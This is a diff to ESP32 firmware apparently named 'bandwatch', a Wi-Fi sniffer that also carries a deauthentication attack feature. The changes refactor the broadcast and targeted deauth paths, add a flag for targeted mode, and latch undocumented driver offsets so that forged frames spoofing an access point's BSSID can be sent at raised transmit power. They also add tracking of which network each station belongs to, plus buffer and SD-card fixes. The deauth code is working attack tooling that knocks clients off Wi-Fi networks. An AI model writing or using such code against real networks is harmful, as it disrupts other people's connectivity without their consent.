@@ -28,7 +28,7 @@ namespace {
 // ---------------------------------------------------------------------------------------------
 // Tunables
 // ---------------------------------------------------------------------------------------------
-constexpr const char* kVersion = "1.5.3";
+constexpr const char* kVersion = "1.5.4";
 constexpr uint32_t kDwellMs = 220;          // Dwell per channel (200–400 ms)
 constexpr uint32_t kUiIntervalMs = 120;     // UI refresh cadence
 constexpr int kStrongThresholdDbm = -65;    // "Strong" frame threshold
@@ -214,7 +214,11 @@ bool deauthParked = false;      // like huntParked: we hold the park on the targ
 volatile uint32_t deauthSent = 0, deauthTxFail = 0;
 uint32_t deauthStartMs = 0;     // millis() when the current attack started; serviceDeauth enforces kDeauthMaxMs
 bool deauthDumped = false;      // DIAGNOSTIC: dump the built frame once per attack
-uint8_t deauthTargetMac[6] = {0};  // for targeted deauth (dca command); empty/broadcast = kick all clients of BSSID
+uint8_t deauthTargetMac[6] = {0};  // for targeted deauth (dca command); only meaningful while deauthTargeted
+// Explicit, because "is deauthTargetMac set?" has no safe byte test: a real station MAC may start 00:00
+// (the IANA 00:00:5E range, for one), and testing only the first two bytes silently demoted such a
+// target back to a broadcast kick.
+volatile bool deauthTargeted = false;
 
 // DIAGNOSTIC: beacon-injection self-test (see sendTestBeacon below), toggled with "txtest 1".
 volatile bool txTestActive = false;
@@ -637,7 +641,7 @@ void IRAM_ATTR parseBeaconIes(WifiDev& d, const uint8_t* payload, uint16_t sigLe
 // sighting: it must never evict a device we have actually heard, and it never overwrites signal data,
 // because the RSSI belongs to whoever sent the frame, not to this device.
 void IRAM_ATTR trackWifiDevice(const uint8_t* mac, int8_t rssi, uint8_t fc0, const uint8_t* payload,
-                               uint16_t sigLen, bool destOnly = false) {
+                               uint16_t sigLen, bool destOnly = false, const uint8_t* bssid = nullptr) {
     const uint32_t now = millis();
     const bool isBeacon = (fc0 == 0x80) || (fc0 == 0x50);   // beacon / probe response
     portENTER_CRITICAL_ISR(&g_devMux);
@@ -656,6 +660,10 @@ void IRAM_ATTR trackWifiDevice(const uint8_t* mac, int8_t rssi, uint8_t fc0, con
         if (destOnly) d.flags |= 4;
     }
     if (!destOnly) d.flags &= ~4;   // heard it transmit: upgrade to tier 2
+    // Association, when the DS bits made it unambiguous. Never cleared once learned: a station that goes
+    // quiet is still on that BSS, and a roam overwrites it on the next frame. Skipped when the BSSID is
+    // this device itself, which is just an AP talking on its own BSS.
+    if (bssid && !macEq(bssid, mac)) { d.apSuffix[0] = bssid[3]; d.apSuffix[1] = bssid[4]; d.apSuffix[2] = bssid[5]; }
     if (destOnly) {
         if (d.frames < 65535) d.frames++;
         d.lastMs = now;
@@ -714,11 +722,19 @@ void IRAM_ATTR promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
     portEXIT_CRITICAL_ISR(&g_accumMux);
 
     if (hasAddr2 && type != WIFI_PKT_CTRL) {
-        trackWifiDevice(ipkt->hdr.addr2, pkt->rx_ctrl.rssi, pkt->payload[0], pkt->payload, sigLen);
+        // Which address is the BSSID depends on the DS bits (802.11-2020 9.3.2.1, table 9-26). Only the two
+        // unambiguous single-hop cases are used; ToDS+FromDS (WDS/mesh) has no station-to-BSS meaning here,
+        // and ToDS=FromDS=0 puts the BSSID in addr3, which is the AP's own address for the beacons that
+        // dominate that case. txBssid = the transmitter's BSS, rxBssid = the addr1 device's BSS.
+        const uint8_t fc1 = pkt->payload[1];
+        const bool toDs = fc1 & 0x01, fromDs = fc1 & 0x02;
+        const uint8_t* txBssid = (toDs && !fromDs) ? ipkt->hdr.addr1 : nullptr;   // station -> AP: addr1 is the BSSID
+        const uint8_t* rxBssid = (!toDs && fromDs) ? ipkt->hdr.addr2 : nullptr;   // AP -> station: addr2 is the BSSID
+        trackWifiDevice(ipkt->hdr.addr2, pkt->rx_ctrl.rssi, pkt->payload[0], pkt->payload, sigLen, false, txBssid);
         // Receiver-side sighting: a device that never transmits during our dwell is still named as addr1
         // by whoever talks to it. Unicast only - broadcast/multicast destinations are not devices.
         if (trackAddr1 && !(ipkt->hdr.addr1[0] & 0x01) && !macEq(ipkt->hdr.addr1, ipkt->hdr.addr2))
-            trackWifiDevice(ipkt->hdr.addr1, pkt->rx_ctrl.rssi, 0, pkt->payload, sigLen, true);
+            trackWifiDevice(ipkt->hdr.addr1, pkt->rx_ctrl.rssi, 0, pkt->payload, sigLen, true, rxBssid);
     }
 
     if (capActive && capRing) {
@@ -1475,7 +1491,7 @@ void printHunt() {
 void printDeauth() {
     if (!deauthActive) { Serial.print("\"deauth\":null"); return; }
     char mac[26], ap[26];
-    bool targeted = (deauthTargetMac[0] || deauthTargetMac[1]);
+    const bool targeted = deauthTargeted;
     fmtMac(mac, sizeof(mac), targeted ? deauthTargetMac : deauthBssid);
     if (targeted) {
         fmtMac(ap, sizeof(ap), deauthBssid);
@@ -1488,7 +1504,10 @@ void printDeauth() {
 }
 
 void sendHello() {
-    if (!serialRoom(780)) return;
+    // 900, not 780: "both" mode (38 channels) + an active hunt + a targeted deauth + an SD path
+    // summed to ~790, and a line that passes the check and then overruns is truncated mid-JSON, which is
+    // exactly what the drop-whole-lines rule exists to prevent.
+    if (!serialRoom(900)) return;
     Serial.printf("{\"t\":\"hello\",\"fw\":\"bandwatch\",\"ver\":\"%s\",\"dwell_ms\":%u,\"band\":\"%s\",\"country\":\"%s\",\"bandmode\":\"%s\","
                   "\"proto\":\"%s\",\"promisc\":\"%s\",\"chs\":[",
                   kVersion, static_cast<unsigned>(kDwellMs), kBandName[bandMode], esp_err_to_name(errCountry), esp_err_to_name(errBand),
@@ -1596,7 +1615,7 @@ void sendDevices() {
     if (wifiMode()) {
         WifiDev* snap = devSnap.w;
         const int n = snapshotWifi(snap, kWifiDevSlots, kDevFreshMs);
-        if (!serialRoom(40 + n * 118)) return;
+        if (!serialRoom(40 + n * 126)) return;
         Serial.print("{\"t\":\"w\",\"dev\":[");
         for (int i = 0; i < n; i++) {
             fmtMac(mac, sizeof(mac), snap[i].mac);
@@ -1606,7 +1625,12 @@ void sendDevices() {
             printJsonStr(d.ssid);
             Serial.printf(",%u,%u,%u,%u,%u,%u,", d.sec, d.pmf, d.phy, d.bw, d.util, d.stations);
             printJsonStr(d.cc[0] ? d.cc : "");   // country IE is 2 raw bytes off the air: escape it like every other string
-            Serial.printf(",%u]", d.surv);
+            // Association suffix as "aabbcc", or "" when this device was never seen on a BSS. The host joins
+            // it against the APs it already knows to recover the full BSSID (see docs/DEVELOPER.md section 17).
+            if (d.apSuffix[0] || d.apSuffix[1] || d.apSuffix[2])
+                Serial.printf(",%u,\"%02x%02x%02x\"]", d.surv, d.apSuffix[0], d.apSuffix[1], d.apSuffix[2]);
+            else
+                Serial.printf(",%u,\"\"]", d.surv);
         }
         Serial.print("]}\n");
     } else {
@@ -1749,10 +1773,15 @@ bool sdOpenCapture() {
                  is154 ? "802154" : isBle ? "ble" : "wifi", tmv.tm_year + 1900, tmv.tm_mon + 1, tmv.tm_mday,
                  tmv.tm_hour, tmv.tm_min, tmv.tm_sec);
     } else {            // no clock: fall back to a counter so files never collide
-        for (int i = 1; i < 10000; i++) {
+        // Resume from the last index used this session instead of rescanning from 1: on a card with many
+        // captures that was up to 10000 FATFS lookups, all of them on the loop task that also hops channels.
+        static int nextSeq = 1;
+        int i = nextSeq;
+        for (; i < 10000; i++) {
             snprintf(sdPath, sizeof(sdPath), "/bandwatch-%s-%04d.pcap", is154 ? "802154" : isBle ? "ble" : "wifi", i);
             if (!SD.exists(sdPath)) break;
         }
+        nextSeq = i + 1;
     }
     sdFile = SD.open(sdPath, FILE_WRITE);
     if (!sdFile) { free(sdBuf); sdBuf = nullptr; return false; }
@@ -1863,15 +1892,22 @@ void sdListFiles() {
     if (!root) { Serial.print("{\"t\":\"err\",\"msg\":\"sdls: cannot open /\"}\n"); return; }
     Serial.print("{\"t\":\"sdls\",\"files\":[");
     bool first = true;
+    uint32_t listed = 0, skipped = 0;
     for (File e = root.openNextFile(); e; e = root.openNextFile()) {
-        if (!e.isDirectory() && serialRoom(120)) {
-            Serial.printf("%s[\"%s\",%lu]", first ? "" : ",", e.name(), static_cast<unsigned long>(e.size()));
-            first = false;
+        if (!e.isDirectory()) {
+            if (serialRoom(120)) {
+                Serial.printf("%s[\"%s\",%lu]", first ? "" : ",", e.name(), static_cast<unsigned long>(e.size()));
+                first = false;
+                listed++;
+            } else {
+                skipped++;   // TX buffer was tight: count it rather than silently shortening the listing
+            }
         }
         e.close();
     }
     root.close();
-    Serial.print("]}\n");
+    Serial.printf("],\"listed\":%lu,\"skipped\":%lu}\n",
+                  static_cast<unsigned long>(listed), static_cast<unsigned long>(skipped));
     sdUnmount();
 }
 
@@ -1996,33 +2032,49 @@ void stopHunt() {
 
 // Deauth: kick all clients of an AP (broadcast mode). 
 // The MAC you provide is treated as the AP's BSSID; broadcast deauth frames are sent.
+// Shared prologue: latch the driver's hmac slot and the state byte that decides the DA/SA/BSSID mapping.
+// slotWord being 0 means neither the STA nor the AP interface has an ieee80211com yet (Wi-Fi not up, or a
+// core whose layout these offsets do not describe). Dereferencing it read address 0x138 and panicked;
+// serviceDeauth() already treats a zero slot as "fall back to raw TX", so record it and let it.
+void latchDeauthSlot() {
+    uint32_t slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 16);   // STA hmac
+    if (!slotWord) slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 20);   // fall back to AP
+    memcpy(deauthSlotPad, &slotWord, 4);
+    deauthHstate = slotWord ? *reinterpret_cast<volatile uint8_t*>(reinterpret_cast<char*>(slotWord) + 312) : 0xFF;
+}
+
+// The channel a BSSID was last heard on. Takes g_devMux: the Wi-Fi task memsets slots in trackWifiDevice,
+// so an unlocked walk can read a half-rewritten entry (every other reader of these tables locks).
+int channelOfBssid(const uint8_t* bssid) {
+    int ch = 0;
+    portENTER_CRITICAL(&g_devMux);
+    for (int i = 0; i < kWifiDevSlots; i++)
+        if (wifiDevs[i].lastMs && macEq(wifiDevs[i].mac, bssid)) { ch = wifiDevs[i].ch; break; }
+    portEXIT_CRITICAL(&g_devMux);
+    return ch;
+}
+
+void parkOnBssid(const uint8_t* bssid) {
+    const int ch = channelOfBssid(bssid);
+    if (ch > 0) { const int idx = indexOfChannel(ch); if (idx >= 0 && chanEnabled(idx)) { setPark(idx); deauthParked = true; } }
+}
+
 void startDeauth(const uint8_t* mac) {
     portENTER_CRITICAL(&g_devMux);
     memcpy(deauthBssid, mac, 6);
-    // Clear any previous targeted mode
-    memset(deauthTargetMac, 0, 6);
+    memset(deauthTargetMac, 0, 6);   // clear any previous targeted mode
+    deauthTargeted = false;
     deauthSent = 0;
     deauthTxFail = 0;
     deauthStartMs = millis();
     deauthDumped = false;
-    uint32_t slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 16);   // STA hmac (panic if 0)
-    if (!slotWord) slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 20);   // fall back to AP
-    memcpy(deauthSlotPad, &slotWord, 4);
-    deauthHstate = *reinterpret_cast<volatile uint8_t*>(reinterpret_cast<char*>(slotWord) + 312);
+    latchDeauthSlot();
     deauthActive = true;
     portEXIT_CRITICAL(&g_devMux);
     (void)esp_wifi_set_max_tx_power(160);   // 16 dBm for the attack (startWifi's 8.2 dBm is tuned for quiet sniffing, not for range)
     if (deauthParked) setPark(-1);                    // restart of a running attack: re-park below
     deauthParked = false;
-    // Find channel for this BSSID/AP
-    int ch = 0;
-    for (int i = 0; i < kWifiDevSlots; i++) {
-        if (wifiDevs[i].lastMs && macEq(wifiDevs[i].mac, deauthBssid)) { 
-            ch = wifiDevs[i].ch; 
-            break;
-        }
-    }
-    if (ch > 0) { const int idx = indexOfChannel(ch); if (idx >= 0 && chanEnabled(idx)) { setPark(idx); deauthParked = true; } }
+    parkOnBssid(deauthBssid);
 }
 
 // Targeted deauth: explicitly target one specific client station by providing both its MAC and the AP's BSSID.
@@ -2030,34 +2082,26 @@ void startDeauthTargeted(const uint8_t* clientMac, const uint8_t* apBssid) {
     portENTER_CRITICAL(&g_devMux);
     memcpy(deauthBssid, apBssid, 6);
     memcpy(deauthTargetMac, clientMac, 6);
+    deauthTargeted = true;
     deauthSent = 0;
     deauthTxFail = 0;
     deauthStartMs = millis();
     deauthDumped = false;
-    uint32_t slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 16);
-    if (!slotWord) slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 20);
-    memcpy(deauthSlotPad, &slotWord, 4);
-    deauthHstate = *reinterpret_cast<volatile uint8_t*>(reinterpret_cast<char*>(slotWord) + 312);
+    latchDeauthSlot();
     deauthActive = true;
     portEXIT_CRITICAL(&g_devMux);
     (void)esp_wifi_set_max_tx_power(160);
     if (deauthParked) setPark(-1);
     deauthParked = false;
-    // Find channel for the AP
-    int ch = 0;
-    for (int i = 0; i < kWifiDevSlots; i++) {
-        if (wifiDevs[i].lastMs && macEq(wifiDevs[i].mac, apBssid)) { 
-            ch = wifiDevs[i].ch; 
-            break;
-        }
-    }
-    if (ch > 0) { const int idx = indexOfChannel(ch); if (idx >= 0 && chanEnabled(idx)) { setPark(idx); deauthParked = true; } }
+    parkOnBssid(deauthBssid);   // park on the AP's channel, not the client's
 }
 
 void stopDeauth() {
     if (!deauthActive) return;
     portENTER_CRITICAL(&g_devMux);
     deauthActive = false;
+    deauthTargeted = false;
+    memset(deauthTargetMac, 0, 6);
     portEXIT_CRITICAL(&g_devMux);
     (void)esp_wifi_set_max_tx_power(82);   // back to startWifi's quiet-sniffing level (startDeauth raised it to 16 dBm)
     // If hunt re-parked after us, this unparks its park too: last writer wins, hopping resumes.
@@ -2195,13 +2239,12 @@ void handleCommand(char* line) {
             stopDeauth();
         }
         char c[26], a[26];
-        fmtMac(c, sizeof(c), deauthTargetMac[0] || deauthTargetMac[1] ? deauthTargetMac : deauthBssid);
+        fmtMac(c, sizeof(c), deauthTargeted ? deauthTargetMac : deauthBssid);
         fmtMac(a, sizeof(a), deauthBssid);
         const int ch = parkedIdx >= 0 ? kChannels[parkedIdx] : 0;
         if (deauthActive) {
-            bool targeted = (deauthTargetMac[0] || deauthTargetMac[1]);
-            Serial.printf("{\"t\":\"ack\",\"cmd\":\"dca\",\"deauth\":[\"%s\",\"%s\",%d,0,0],\"park\":%d}\n", 
-                          c, a, targeted ? 1 : 0, ch);
+            Serial.printf("{\"t\":\"ack\",\"cmd\":\"dca\",\"deauth\":[\"%s\",\"%s\",%d,0,0],\"park\":%d}\n",
+                          c, a, deauthTargeted ? 1 : 0, ch);
         } else {
             Serial.printf("{\"t\":\"ack\",\"cmd\":\"dca\",\"deauth\":null,\"park\":%d}\n", ch);
         }
@@ -2411,7 +2454,7 @@ void sendInternalKick() {
         v |= 0x1C000u;   // build 8: (param+len)<<16 with len 26, so the reason code fits on air after ppTxPkt's +8 shift
         *ebw = v;
     }
-    const uint8_t* daMac = (deauthTargetMac[0] || deauthTargetMac[1]) ? deauthTargetMac : kBcastMac;  // targeted or broadcast
+    const uint8_t* daMac = deauthTargeted ? deauthTargetMac : kBcastMac;
     ieee80211_send_setup(deauthSlotPad, desc, 192, 16,
                          deauthBssid,                                     // A4 → SA (the AP we spoof)
                          daMac,                                           // A5 → DA (hstates 1/3) / BSSID slot (hstate 0)
@@ -2704,7 +2747,7 @@ void buildHuntPage(lv_obj_t* page) {
 void buildSystemPage(lv_obj_t* page) {
     lv_obj_t* hdrRight;
     make_header(page, "System", &hdrRight);
-    char v[8];
+    char v[16];   // "v1.10.0" already overflowed the old char[8]
     snprintf(v, sizeof(v), "v%s", kVersion);
     lv_label_set_text(hdrRight, v);
     lv_obj_t* box = make_panel(page, 280, BG_565, 2);
@@ -3068,7 +3111,7 @@ void refreshSystem(float global) {
     else snprintf(buf, sizeof(buf), "hunt off");
     if (deauthActive) {
         char d[26];
-        fmtMac(d, sizeof(d), deauthBssid);
+        fmtMac(d, sizeof(d), deauthTargeted ? deauthTargetMac : deauthBssid);   // the MAC actually being kicked
         snprintf(buf + strlen(buf), sizeof(buf) - strlen(buf), " · kick %s", d);   // buf is 64: both MACs fit
     }
     lv_label_set_text(sysLines[n++], buf);
